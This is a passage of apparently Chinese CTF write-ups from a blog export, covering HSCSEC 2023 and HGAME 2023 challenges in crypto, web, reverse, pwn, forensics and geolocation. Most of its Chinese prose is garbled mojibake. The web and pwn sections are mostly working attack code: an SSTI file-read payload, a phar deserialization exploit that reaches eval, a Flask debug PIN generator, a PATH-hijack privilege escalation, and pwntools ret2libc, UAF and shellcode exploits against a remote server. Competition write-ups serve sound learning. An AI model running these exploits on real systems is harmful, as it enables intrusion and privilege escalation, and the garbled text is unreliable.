number2print(result)&quot;&quot;&quot;Output:114883593759168168187318682525591194001261745930416081708838185462547918464796644551201943503550870174777448283518061579301991574629130635135124214606784711890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771&quot;&quot;&quot; $m$ ä¸ $n_1$ ï¼ˆ512ä½ï¼‰ä¹˜ç§¯çš„å¤§å°ä¸ä¼šè¶…è¿‡ $n_2$ å¤§å°ï¼ˆ1024ä½ï¼‰ï¼Œæ•… $c=mn_1$ã€‚ 123456n1 = 11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471c = 1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771print(bytes.fromhex(hex(c//n1)[2:]))# b&#x27;flag&#123;qMmZqWvmj70bBsCfmVLT&#125;&#x27; â€‹ EZVC 123456789101112131415161718# -*- coding: utf-8 -*-import flagalphabet = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#x27;key = &#x27;HSC&#x27;assert flag.startswith(&#x27;HSCSEC&#123;&#x27;)flag_num_list = []c = []for item in flag: flag_num_list.append(alphabet.find(item) + 1)key_num = alphabet.find(key) + 1for i in flag_num_list: m = (i + key_num) % 94 - 1 if m == 0: c.append(&quot;â–¡&quot;) c.append(alphabet[m-1:m])print(&quot;c = &#123;&#125;&quot;.format(&#x27;&#x27;.join(c)))# c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi| ä»£ç é‡Œé¢çš„ key_num å…¶å®å›ºå®šä¸º0ï¼Œå®é™…å½“1ï¼Œæ¨¡è¿ç®—ä¹Ÿæ²¡å•¥ç”¨ï¼Œå®é™…æ˜¯rot1å‡¯æ’’åŠ å¯†ï¼Œè¿˜åŸï¼š 123456c = &#x27;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&#x27;alphabet = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#x27;flag = [alphabet[alphabet.index(k)+1] for k in c]print(&#x27;&#x27;.join(flag))# HSCSEC&#123;kh21jk3h12j-h312hj-3hj3-123jhbjhbhj&#125; â€‹ WEBEZSSTIåŸºæœ¬æ²¡è¿‡æ»¤çš„SSTIï¼Œå°è¯• ?name=&#123;&#123;sss.__init__.__globals__.__builtins__.open(\"/flag\").read()&#125;&#125; æŠ¥é”™æ— æ³•æ‰“å¼€ / ï¼Œè¯´æ˜ flag è¢«æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™ç»•è¿‡å³å¯ï¼š ?name=&#123;&#123;sss.__init__.__globals__.__builtins__.open(\"/flflagag\").read()&#125;&#125; â€‹ EASYPHYæŸ¥çœ‹é¦–é¡µæºç ï¼Œå‘ç°uploadå’Œviewä¸¤ä¸ªå¯¹è¯æ¡†åŒ…æ‹¬å…³é”®å­—æ®µ name=&quot;acti0n&quot;ï¼ŒæŠ“åŒ…çœ‹åˆ° ?acti0n=upload çš„è®¿é—®æ–¹å¼ï¼Œä¸ºæ–‡ä»¶åŒ…å«æ¼æ´ç‚¹ã€‚ é€šè¿‡è®¾ç½® acti0n å‚æ•°å’Œfilterè¿‡æ»¤å™¨è®¿é—®ï¼Œå¾—åˆ° upload.php å’Œ view.php æºç ã€‚å®¡è®¡ä»£ç ï¼Œupload.php ä¸­åŒ…å«ä¸Šä¼ æ–‡ä»¶ä¸æ‹¦æˆªè¿‡æ»¤å±é™©å‡½æ•°çš„åŠŸèƒ½ï¼Œview.php ä¸­æœ‰ eval() å‡½æ•°ï¼Œåªéœ€è¦ä¿®æ”¹ç±»ä¸­çš„ç§æœ‰å˜é‡ $cmd å°±å¯ä»¥æ‹¿åˆ°shellã€‚ å…¶ä¸­ file_exists() å‡½æ•°ç»“åˆæ–‡ä»¶ä¸Šä¼ å¯ä»¥æƒ³åˆ°pharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ã€‚ç»“åˆ upload.php ä¸­å…³é”®å­—é»‘åå•ï¼Œä½¿ç”¨ show_source() å‡½æ•°è¯»å– flag.php æ–‡ä»¶ã€‚ æ„é€ pharæ–‡ä»¶ï¼š 12345678910111213141516171819202122&lt;?php class View &#123; public $dir; private $cmd; function __construct() &#123; $this-&gt;cmd = &#x27;show_source(&quot;flag.php&quot;);&#x27;; &#125; function __destruct() &#123; eval($this-&gt;cmd); &#125; &#125; $phar = new Phar(&#x27;phar.phar&#x27;); $phar -&gt; startBuffering(); $phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;); $phar -&gt;addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;); $object = new View(); $phar -&gt; setMetadata($object); $phar -&gt; stopBuffering(); ?&gt; æœ¬åœ°è¿è¡Œç”Ÿæˆ phar.pharï¼Œç„¶åç›´æ¥ä¸Šä¼ ã€‚æ–‡ä»¶ä¸Šä¼ æˆåŠŸä¹‹åï¼Œé€šè¿‡ delete è¿™ä¸ªå‚æ•°æ¥è§¦å‘ file_exists() æ‰å¯ä»¥åˆ©ç”¨pharï¼ŒPOSTå‚æ•° delete=phar://phar.phar å³å¯æ‹¿åˆ°flagã€‚ â€‹ EZSYFLASKæœ‰ä¸€ä¸ªå¯ä»¥æ–‡ä»¶åŒ…å«çš„è·¯ç”±ï¼šGET /view?filename=app.pyï¼Œå¾—åˆ°æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from flask import Flask,request,render_template_stringapp = Flask(__name__)@app.route(&quot;/&quot;)def index(): return &#x27;GET /view?filename=app.py&#x27;@app.route(&quot;/view&quot;)def viewFile(): filename = request.args.get(&#x27;filename&#x27;) if(&quot;flag&quot; in filename): return &quot;WAF&quot; if(&quot;cgroup&quot; in filename): return &quot;WAF&quot; if(&quot;self&quot; in filename): return &quot;WAF&quot; try: with open(filename, &#x27;r&#x27;) as f: templates=&#x27;&#x27;&#x27; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;æ–‡ä»¶å­˜åœ¨&lt;/title&gt; &lt;/head&gt; &lt;h1&gt; &#123;&#125; &lt;/h1&gt; &lt;/html&gt; &#x27;&#x27;&#x27;.format(f.read()) return render_template_string(templates) except Exception as e: templates=&#x27;&#x27;&#x27; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;æ–‡ä»¶ä¸å­˜åœ¨&lt;/title&gt; &lt;/head&gt; &lt;h1&gt; æ–‡ä»¶ä¸å­˜åœ¨ &lt;/h1&gt; &lt;/html&gt; &#x27;&#x27;&#x27; return render_template_string(templates)if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=80, debug=True) å»é™¤å‚æ•°å¯ä»¥è§¦å‘debugæŠ¥é”™é¡µï¼Œè®¡ç®—PINå€¼å¯ä»¥è¿›å…¥è°ƒè¯•æ¨¡å¼ã€‚ç”±äºç¦ç”¨äº† flag/self/cgroupï¼Œ/proc/self/cgroup è·å–ä¸åˆ°ï¼Œå¯ä»¥åˆ©ç”¨ /proc/1/mountinfo è·å–docker-idï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243# &gt;=3.8 sha1import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;app&#x27;# /etc/passwd &#x27;flask.app&#x27;,# é»˜è®¤å€¼ &#x27;Flask&#x27;,# é»˜è®¤å€¼ &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # æŠ¥é”™å¾—åˆ°]private_bits = [ str(int(&#x27;0242ac0208fe&#x27;,16)),# /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶ #machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/1/mountinfo &#x27;7265fe765262551a676151a24c02b7b6&#x27;+&#x27;bcf34bfb0be38980dddd4de1d57a8b7da2de7843ee55ed110016b97f5163406c&#x27;]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) è¾“å…¥PINç è¿›å…¥è°ƒè¯•æ¨¡å¼ï¼Œåœ¨æ ¹ç›®å½•ä¸‹å‘ç° /flag å’Œ /readflagï¼Œ/flag æ— æƒé™è¯»ï¼Œè€Œ /readflag æœ‰SUIDæƒé™ï¼Œéœ€è¦ææƒï¼š 1234567cd /tmpecho \\&quot;/bin/bash\\&quot;&gt;pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /./readflag è¾“å…¥ print(os.popen(&quot;cd /tmp;echo \\&quot;/bin/bash\\&quot;&gt;ps;chmod 777 ps;echo $PATH;export PATH=/tmp:$PATH;cd /;./readflag&quot;).read()) å¾—flagã€‚ â€‹ REVERSEDECOMPILEONEOONEç…§ä»£ç é€»è¾‘è¿˜åŸå³å¯ã€‚ 12345678910111213141516171819from Crypto.Util.number import *c = [0x5C797E8971697066,0x8D83497D7F6F7A3D,0x949DA8758277A9A5,0xB7954D7C]cc = []for k in c: cc += list(long_to_bytes(k)[::-1])for i in range(28): if (i&amp;1)!=0: cc[i] = cc[i]+i+1 else: cc[i] = cc[i]+i cc[i] ^= i + 1 cc[i] -= 3 * i + 1print(bytes(cc))# b&#x27;flag&#123;reV3rSe_1s_sucH_hanD1e&#125;&#x27; â€‹ Whack-a-moleåŠ¨è°ƒè¿‡åè°ƒè¯•å’Œä¸­é—´çš„åˆ¤æ–­æ¡ä»¶ï¼Œä½¿å¾—æµç¨‹èµ°å‘æ­£ç¡®çš„å¤„ç†å‡½æ•°é‡Œï¼Œæœ€ååœ¨ Source å­—ç¬¦ä¸²ä¸­æŸ¥çœ‹åˆ°å·²ä¿®æ”¹å¾—åˆ°çš„å­—ç¬¦ä¸²ï¼šw1n32_aP å’Œ i_iS_FUnï¼Œè¿æ¥å¾—flagï¼šflag&#123;w1n32_aPi_iS_FUn&#125;ã€‚ â€‹ Base secretsrustç¨‹åºï¼Œæ¯”è¾ƒéš¾çœ‹ï¼Œç»“åˆé¢˜ç›® Base è·Ÿè¸ªä¸€ä¸‹ä»£ç é€»è¾‘ï¼Œå‘ç°ç¼–ç åçš„å­—ç¬¦ä¸² hexZh3tyVXM3X2AwX35yM+IxRU1nkz5nmWdzhXdF7Qo=ã€‚ è·Ÿè¿›åˆ°encodeä»£ç éƒ¨åˆ†ï¼Œæå–å‡ºç è¡¨ä¸º 456789+-IJKLMNOPQRSTUVWXghijklmnYZabcdefopqrstuvwxyz0123ABCDEFGHï¼Œ base64è§£ç å¾—flagï¼šflag&#123;rUs7_n0_pr0b1EM_s0_yisey&#125;ã€‚ â€‹ PWNEZPWNç®€å•ret2shellcodeã€‚ 12345678910from pwn import *context(arch=&#x27;amd64&#x27;)r=remote(&#x27;43.143.254.94&#x27;,10059)buf2=0x404080pl=asm(shellcraft.sh()).ljust(0x110,&#x27;a&#x27;)+p64(buf2)+p64(buf2)r.send(pl)r.interactive() â€‹ Morris IIåœ¨ main() -&gt; fight_system() -&gt; confirm_input() -&gt; read() ä¸­å‘ç°æ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œæœ‰backdoorï¼Œå†ret2textå³å¯ã€‚ 123456789101112131415#coding=utf-8from pwn import *r=remote(&#x27;43.143.254.94&#x27;,10396)dontlookatme=0x401236ret=0x40101ar.sendlineafter(&#x27;from belowï¼š&#x27;,&#x27;0&#x27;)r.recvuntil(&#x27;hero\\&#x27;s name!:\\n&#x27;)pl=&#x27;a&#x27;*(0x10+8)+p64(ret)+p64(dontlookatme)r.send(pl)r.interactive() â€‹ EasyHeapç±»ä¼¼ctf-wikiçš„hacknoteï¼ŒUAFèœå•é¢˜ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *r=remote(&#x27;43.143.254.94&#x27;,10575)elf=ELF(&#x27;./Safe_Program&#x27;)libc=ELF(&#x27;./libc-2.31.so&#x27;)def add(size, content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content)def dele(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def show(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) magic = 0x80495BDadd(32, &quot;aaaa&quot;) # add note 0add(32, &quot;ddaa&quot;) # add note 1dele(0) # delete note 0dele(1) # delete note 1add(8, p32(magic)) # add note 2show(0) # show note 0r.interactive() â€‹ Safe Programret2libcï¼Œéœ€è¦æ ¹æ®æ³„éœ²åœ°å€æŸ¥è¯¢libcä¸ºlibc-2.31ã€‚ 1234567891011121314151617181920212223242526272829from pwn import *r=remote(&#x27;43.143.254.94&#x27;,10914)elf=ELF(&#x27;./Safe_Program&#x27;)libc=ELF(&#x27;./libc-2.31.so&#x27;)pop_rdi=0x401393pop_rsi_r15=0x401391ret=0x40101aputs_plt=elf.plt.putsputs_got=elf.got.putsmain=0x401247r.recvuntil(&#x27;talk to me now:\\n\\n&#x27;)pl=&#x27;a&#x27;*(0x80+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)r.send(pl)puts_addr=u64(r.recv(6)+&#x27;\\x00&#x27;*2)print(hex(puts_addr))libc_base=puts_addr-libc.sym.putsprint(hex(libc_base))system=libc_base+libc.sym.systembinsh=libc_base+libc.search(&#x27;/bin/sh\\x00&#x27;).next()r.recvuntil(&#x27;talk to me now:\\n\\n&#x27;)pl=&#x27;a&#x27;*(0x80+8)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(0)*2+p64(system)+p64(main)r.send(pl)r.interactive() â€‹ Social EngineeringHappy Lantern Festivalå›¾ç‰‡ä¿¡æ¯æœ‰é˜¿å‹’æ³°å¸‚ç¬¬åä¸‰å±Šå…ƒå®µç¯ä¼šï¼Œæœç´¢åˆ°ä¸¾åŠåœ°ä¸ºäº”ç™¾é‡Œé£æƒ…è¡—ï¼Œå†åœ¨åœ°å›¾æœå…·ä½“åœ°å€ã€‚ HSCSEC&#123;æ–°ç–†ç»´å¾å°”è‡ªæ²»åŒºé˜¿å‹’æ³°åœ°åŒºé˜¿å‹’æ³°å¸‚äº”ç™¾é‡Œé£æƒ…è¡—&#125; â€‹ Beautiful Lakeæ”¾å¤§å›¾ç‰‡å‘ç°å®å¤ç†å·¥å­¦é™¢ï¼Œæœç´¢å®å¤ç†å·¥å­¦é™¢é™„è¿‘çš„æ¹–ä¸ºæ˜Ÿæµ·æ¹–ï¼Œå†åœ¨åœ°å›¾æœå…·ä½“åœ°å€ã€‚ HSCSEC&#123;å®å¤å›æ—è‡ªæ²»åŒºçŸ³å˜´å±±å¸‚å¤§æ­¦å£åŒºæ˜Ÿæµ·æ¹–&#125; â€‹ Apple Storeç™¾åº¦è¯†å›¾ï¼Œæœåˆ°åœ°ç‚¹ä¸ºappleå®˜æ–¹(è¥¿å•å¤§æ‚¦åŸåº—)ï¼Œå†åœ¨åœ°å›¾æœå…·ä½“åœ°å€ã€‚ HSCSEC&#123;åŒ—äº¬å¸‚è¥¿åŸåŒºè¥¿å•åŒ—å¤§è¡—131å·&#125; â€‹ Beautiful Parkç™¾åº¦è¯†å›¾ï¼Œæœåˆ°æ–°é—»ï¼šååŒ—æœ€å¤§çš„æ¹¿åœ°å…¬å›­ä½äºç¢§æ¡‚å›­å®˜å…è“åŒ—ä¾§ äº”ä¸€å‡æœŸæ¥è¿™é‡Œç©æ°´ä¹˜å‡‰ çœ‹æµ·æ£ èŠ±å§ï¼Œå¾—åˆ°å…¬å›­åï¼Œå†åœ¨åœ°å›¾æœå…·ä½“åœ°å€ã€‚ HSCSEC&#123;æ²³åŒ—çœå¼ å®¶å£å¸‚æ€€æ¥å¿å®˜å…æ°´åº“å›½å®¶æ¹¿åœ°å…¬å›­&#125; â€‹ Boatç™¾åº¦è¯†å›¾å®šä½æ­å·è¥¿æ¹–ï¼Œå†åœ¨åœ°å›¾æœå…·ä½“åœ°å€ã€‚ HSCSEC&#123;æµ™æ±Ÿçœæ­å·å¸‚è¥¿æ¹–åŒºé¾™äº•è·¯1å·&#125; â€‹ Airplaneé£æœºå›¾ç‰‡é‡Œä¿¡æ¯æœ‰B-30ELå‹å·ï¼Œæœç´¢åˆ°æ–°é—»ï¼šåˆå¤šäº†ä¸€ä¸ªä¸­å‹èˆªç©ºå…¬å¸ é‡åº†èˆªç©ºç¬¬30æ¶é£æœºå…¥åˆ—ï¼Œé‡Œé¢æåˆ° æ¸å…´å¿«çº¿ï¼Œå†æ ¹æ®åœ°é¢æœºåœºç‰¹å¾ï¼Œä¸åœ°å›¾æ¯”å¯¹ï¼Œä¸ºåŒ—äº¬å¤§å…´å›½é™…æœºåœºã€‚ HSCSEC&#123;åŒ—äº¬å¸‚å¤§å…´åŒºå¤§å…´å›½é™…æœºåœº&#125; â€‹ Towerç™¾åº¦è¯†å›¾ä¸ºæ¾³é—¨åŸƒè²å°”é“å¡”ï¼Œåœ¨åœ°å›¾æœå…·ä½“åœ°å€ï¼Œå¤šæ¬¡å°è¯•æ‰æ­£ç¡®ã€‚ HSCSEC&#123;æ¾³é—¨ç‰¹åˆ«è¡Œæ”¿åŒºè·¯æ°¹å¡«æµ·åŒºæ¾³é—¨è·¯æ°¹é‡‘å…‰å¤§é“è¿è´¯å…¬è·¯æ¾³é—¨å·´é»äºº&#125; â€‹ Cable carä¸€çœ¼é‡åº†ç´¢é“ï¼Œæ ¹æ®ç´¢é“å’Œå¤§æ¡¥çš„è§†è§’ï¼Œåœ¨åœ°å›¾ä¸Šæ‰¾åˆ°å¤§è‡´èŒƒå›´ï¼Œåœ¨åˆ©ç”¨åœ°å›¾3Dæ¨¡å¼ï¼Œå‘ç°é è¿‘æ±Ÿè¾¹çš„æ¥¼æœ€é«˜ï¼Œåªå¯èƒ½åœ¨è¿™æ ‹æ¥¼é‡Œï¼Œå¦åˆ™æŒ¡è§†çº¿ã€‚æ¥¼é‡Œæœ‰æ ‡æ³¨ç€å±±ä»€é›†ï¼Œåœ¨ç¾å›¢ä¸Šä¹Ÿèƒ½çœ‹åˆ°ç±»ä¼¼å›¾ç‰‡çš„åˆ†äº«ï¼Œå°è¯•è¯¥å…·ä½“åœ°å€æˆåŠŸã€‚ HSCSEC&#123;é‡åº†å¸‚æ¸ä¸­åŒºç™½è±¡å±…4å·æ¥¼9-1å·&#125; â€‹ Romantic fireworkå›¾ç‰‡æ¯”è¾ƒæ¨¡ç³Šï¼Œæ”¾å¤§æŸ¥çœ‹æ¶ˆé˜²å‘˜è¡£æœèƒŒåå­—æ ·ï¼ŒçŒœæµ‹å‡ºç”˜è‚ƒæ¶ˆé˜²ï¼Œå†æœç´¢ ç”˜è‚ƒ ç„°ç«ï¼Œçœ‹åˆ°æ–°é—»ï¼šç”˜è‚ƒçœç™½é“¶å¸‚å‡Œç©ºé€ å‡ºä¸¤åº§â€ç«ç„°å±±â€ï¼Œæµé˜³ä¸­æ´²çƒŸèŠ±é›†å›¢5.5ä¸‡å‘é«˜ç©ºç¤¼èŠ±é—ªè€€å…ƒå®µå¤œï¼Œæ–°é—»ä¸­æœ‰æå…¶ç›¸ä¼¼çš„ç…§ç‰‡ï¼›åœ°ç‚¹ä¸ºç™½é“¶åŸåŒºé‡‘å²­å…¬å›­ï¼Œå†åœ¨åœ°å›¾æœå…·ä½“åœ°å€ã€‚ HSCSEC&#123;ç”˜è‚ƒçœç™½é“¶å¸‚ç™½é“¶åŒºé‡‘å²­å…¬å›­&#125; â€‹","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023èµ›","slug":"2023èµ›","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HGAME 2023 Week 4","slug":"match-HGAME-2023-Week-4","date":"2023-02-06T13:43:16.000Z","updated":"2023-02-07T12:07:47.828Z","comments":true,"path":"2023/02/06/match-HGAME-2023-Week-4/","permalink":"https://lazzzaro.github.io/2023/02/06/match-HGAME-2023-Week-4/","excerpt":"","text":"â€‹ HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)çº¿ä¸Šèµ›å¹³å°ï¼šhttps://hgame.vidar.clubè¯·å°½å¿«æ³¨å†Œï¼Œæ³¨å†Œæ—¶è¯·é€‰æ‹©æ ¡å¤–é€‰æ‰‹ï¼Œæ³¨å†Œå°†äº 1 æœˆ 12 æ—¥ 20:00 å…³é—­æœ¬æ¬¡æ¯”èµ›çš„å¥–åŠ±äº‹å®œä»¥åŠèµ›åæ²Ÿé€šåé¦ˆä»¥é‚®ä»¶ä¸ºä¸»ï¼Œè¯·å„ä½ä½¿ç”¨çœŸå®çš„é‚®ä»¶åœ°å€æ¯”èµ›å¥–é‡‘(é’ˆå¯¹æ ¡å¤–æ¦œ)ï¼šç¬¬1åï¼š1000Pwnhubé‡‘å¸ç¬¬2åï¼š800Pwnhubé‡‘å¸ç¬¬3åï¼š600Pwnhubé‡‘å¸4-10åï¼š300Pwnhubé‡‘å¸è¡¥å……è¯´æ˜ï¼šæ’è¡Œæ¦œåˆ†æ•°ç›¸åŒè€…ï¼Œä»¥å…ˆè¾¾åˆ°è¯¥åˆ†æ•°çš„æ—¶é—´æ¬¡åºåˆ’å®šæ’åï¼Œæ¯ä½è·å¥–é€‰æ‰‹é¢å¤–èµ é€ Pwnhub é‚€è¯·ç ä¸€ä¸ªæ³¨æ„ï¼š* æ‰€æœ‰é€‰æ‰‹å‡ä»¥ä¸ªäººä¸ºå•ä½å‚èµ›ï¼›* åœ¨è§£é¢˜è¿‡ç¨‹ä¸­é‡åˆ°ç“¶é¢ˆæˆ–å›°éš¾å¯ä»¥ç§èŠå‡ºé¢˜äºº* ç¦æ­¢æ‰€æœ‰ç ´åæ¯”èµ›å…¬å¹³å…¬æ­£çš„è¡Œä¸ºï¼Œå¦‚ï¼šæ•£æ’­æˆ–ä¸å…¶ä»–äººäº¤æ¢ Flagã€è§£é¢˜æ€è·¯ï¼Œå¯¹å¹³å°ã€å‚èµ›è€…æˆ–å…¶ä»–äººå‘˜è¿›è¡Œæ”»å‡»ã€‚è¿è€…åˆ†æ•°ä½œåºŸå¹¶å–æ¶ˆæ¯”èµ›èµ„æ ¼ã€‚* HGAME çº¿ä¸Šèµ›åˆ†ä¸ºå››å‘¨ï¼Œæ¯å‘¨è‡³å®˜æ–¹wpå‘å¸ƒå‰å‰ç¦æ­¢ä¸€åˆ‡è®¨è®ºæœ¬å‘¨é¢˜ç›®ä»¥åŠå…¬å¼€è‡ªå·± wp çš„è¡Œä¸ºã€‚åœ¨æ”¶é›†å®Œæˆåä¼šå¼€æ”¾è®¨è®ºï¼Œä½†ä»…èƒ½è®¨è®ºå·²ç»“æŸçš„é¢˜ç›®ã€‚* æ¯å‘¨æ¯”èµ›ç»“æŸåæœ¬å‘¨å‰20åéœ€æäº¤wpåˆ°æŒ‡å®šé‚®ç®±æœ¬æ¯”èµ›æœ€ç»ˆè§£é‡Šæƒå½’ Vidar-Team æ‰€æœ‰ Rank: 9 / Total Rank: 8 â€‹ MiscezWin (variables/auth/7zip) éå¸¸å¸¸è§„çš„ Windows å†…å­˜å–è¯ï¼Œè¯·ä½¿ç”¨ volatility3 æ³¨ï¼šç³»åˆ—é¢˜ç›®ä½¿ç”¨åŒä¸€ä¸ªé•œåƒï¼Œä½¿ç”¨ä¸‹æ–¹ä»»æ„é“¾æ¥ä¸‹è½½ä¸€æ¬¡å³å¯ https://pan.baidu.com/s/1FDQeEVFSSznEGpqmWgS47w?pwd=57l8 https://pan.quark.cn/s/9418099763d7 https://mega.nz/file/KzIigTKR#PqV-l7LX5X4pmBHFJQVE8g2mFS60XCbQjTmw-el92ts ä½¿ç”¨volatility3åˆ†æWindows 10é•œåƒã€‚ 1. variables æŸ¥çœ‹ç¯å¢ƒå˜é‡ï¼š python vol.py -f win10_22h2_19045.2486.vmem windows.envars å¾—åˆ°ç¬¬1ä¸ªflagå€¼ï¼šhgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;ã€‚ 2. 7zip æŸ¥æ‰¾7zæ–‡ä»¶ï¼š python3 vol.py -f win10_22h2_19045.2486.vmem windows.filescan | grep -i 7z æ‰¾åˆ° flag.7zï¼Œå¯¼å‡ºï¼š python3 vol.py -f win10_22h2_19045.2486.vmem windows.dumpfiles --virtaddr 0xd0064181c950 æ‰“å¼€å‘ç°éœ€è¦å¯†ç ï¼Œå†…å«æ–‡ä»¶ crack_nt_hash_for_7z_pwd.txtï¼Œæ–‡ä»¶åå³æç¤ºï¼Œéœ€è¦ç ´è§£NTHashå€¼å¾—åˆ°è§£å‹å¯†ç ã€‚ æå–è´¦æˆ·ä¿¡æ¯ï¼š python3 vol.py -f win10_22h2_19045.2486.vmem windows.hashdump å¾—åˆ°ï¼š 1Noname 1000 aad3b435b51404eeaad3b435b51404ee 84b0d9c9f830238933e7131d60ac6436 ä½¿ç”¨cmd5æŸ¥è¯¢å¾—åˆ° 84b0d9c9f830238933e7131d60ac6436 å¯¹åº”æ˜æ–‡ä¸º asdqwe123ï¼Œè§£å‹å¾—åˆ°flagï¼šhgame&#123;e30b6984-615c-4d26-b0c4-f455fa7202e2&#125;ã€‚ 3. auth æŸ¥çœ‹å‘½ä»¤è¡Œå†å²è®°å½•ï¼š python vol.py -f win10_22h2_19045.2486.vmem windows.cmdline å‘ç°æç¤º flag2 is current user nthash...ï¼Œæ ¹æ®ä¸Šä¸€é¢˜hashdumpå¾—åˆ°çš„ç»“æœï¼Œflagä¸ºï¼šhgame&#123;84b0d9c9f830238933e7131d60ac6436&#125;ã€‚ â€‹ CryptoLLLCG â€œæˆ‘ä¿ç•™äº†å¤§éƒ¨åˆ†LCGçš„ç‰¹å¾ï¼Œä½†æ˜¯ä¹Ÿå»é™¤äº†ä¸€éƒ¨åˆ†ï¼Œè¿™æ ·æ‰çŸ¥é“ä½ ä»¬éœ€è¦ç”¨åˆ°LLLâ€ï¼Œâ€ä½ æ˜¯æœ‰æ„æŠŠå®ƒå»é™¤çš„å—â€ï¼Œâ€æ˜¯å‡ºé¢˜çš„è¿‡ç¨‹ä¸­æˆ‘å»é™¤äº†ä¸€éƒ¨åˆ†â€ï¼Œâ€æ˜¯æ•…æ„çš„è¿˜æ˜¯ä¸å°å¿ƒâ€ï¼Œâ€æ˜¯æ•…æ„çš„â€ 1234567891011121314151617181920212223from Crypto.Util.number import *from random import randintfrom sage.all import next_primefrom flag import flagclass LCG(): def __init__(self) -&gt; None: self.n = next_prime(2**360) self.a = bytes_to_long(flag) self.seed = randint(1, self.n-1) def next(self): self.seed = self.seed * self.a + randint(-2**340, 2**340) % self.n return self.seedlcg = LCG()outputs = []for i in range(40): outputs.append(lcg.next())with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as f: f.write(str(outputs)) å‡ºé¢˜å¤±è¯¯ï¼Œself.seed = self.seed * self.a + randint(-2**340, 2**340) % self.n è¯¥å¥ä»£ç æœªåŠ æ‹¬å·ï¼Œä¸” $r \\in [-2^{340},2^{340}]&lt; \\text{seed} &lt;n$ï¼Œç›´æ¥åšæ•´é™¤æ“ä½œå¯ä»¥æ¢å¤ $a$ã€‚ 12345678910c = [...]for i in range(1,40): m = c[i]//c[i-1] try: print(bytes.fromhex(hex(m)[2:])) except: pass b&#x27;hgame&#123;W0w_you_know_the_hidden_number_problem&#125;&#x27; â€‹ LLLCG Revenge 1234567891011121314151617181920212223&gt;from Crypto.Util.number import *from random import randint&gt;from sage.all import next_primefrom flag import flag class LCG(): def __init__(self) -&gt; None: self.n = next_prime(2**360) self.a = bytes_to_long(flag) self.seed = randint(1, self.n-1) def next(self): self.seed = (self.seed * self.a + randint(-2**340, 2**340)) % self.n return self.seed lcg = LCG() outputs = [] for i in range(40): outputs.append(lcg.next()) with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as f: f.write(str(outputs)) ä¿®å¤åï¼Œæœ‰ $s_{i+1} \\equiv as_i+r_i \\pmod n,i \\in [0,38)$ï¼Œå³ $s_{i+1}=as_i+r_i+k_in,i \\in [0,38)$ã€‚ ä»¤ $A_i=s_i,B_i=-s_{i+1},x=a$ï¼Œæœ‰ $-r_i = A_ix+B_i+k_in$ï¼Œå…¸å‹HNPé—®é¢˜ï¼Œæ„å»ºæ ¼ï¼š $M = \\begin{bmatrix} n &amp; &amp; &amp; &amp; &amp; &amp; \\newline &amp; n &amp; 